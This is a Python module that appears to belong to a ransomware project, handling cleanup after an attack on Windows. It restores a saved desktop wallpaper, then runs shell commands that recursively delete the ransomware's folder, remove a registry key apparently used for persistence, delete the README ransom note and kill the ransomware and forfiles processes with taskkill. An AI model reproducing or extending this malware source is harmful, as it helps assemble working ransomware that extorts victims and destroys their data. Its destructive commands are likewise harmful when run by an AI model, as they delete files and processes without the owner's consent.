from subprocess import Popen
from os.path import dirname,realpath
from os import system
import sys
from ctypes import windll
from os.path import normpath
# Local import Constant
current = dirname(realpath(__file__))
current_dir = dirname(current)
sys.path.append(current_dir)
# Import 
from const import *

class Clean:


    @staticmethod
    def get_wallpaper():
        'Save current wallpaper'
        try:
            with open(f'{PATH_RANCON}\\current_wallpaper.txt','r') as f:
                wallpaper = f.read()

            Clean.set_wallpaper(wallpaper)
        except:pass


    @staticmethod
    def set_wallpaper(wallpaper):
        'change_wallpaper'
        try : 
            path_wallpaper = normpath(wallpaper) # Create a normal path
            print(path_wallpaper)
            SPI_SETDESKWALLPAPER = 20
            windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path_wallpaper , 0) # Change wallpaper
        except Exception as e:
            print(e)
        Clean.cleanup()


    @staticmethod
    def cleanup(): 
        'Delete files and process'
        try:
            system(f'rmdir /S /Q {PATH_RANCON}') # Remove ransomw dir
            system(f'reg delete {KEY_REGEDIT} /v test /f') # Delete key reg
            system(f'del {README_FILE}') # Delete README.txt
            system(f'cmd /c ping localhost -n 3 > nul & taskkill /IM "{EXE_NAME}.exe" /F & taskkill /IM "forfiles.exe" /F & taskkill /IM "forfiles.exe" /F') # Delete all process
        except:pass

if __name__ == "__main__" : 

    a = Clean
    a.cleanup()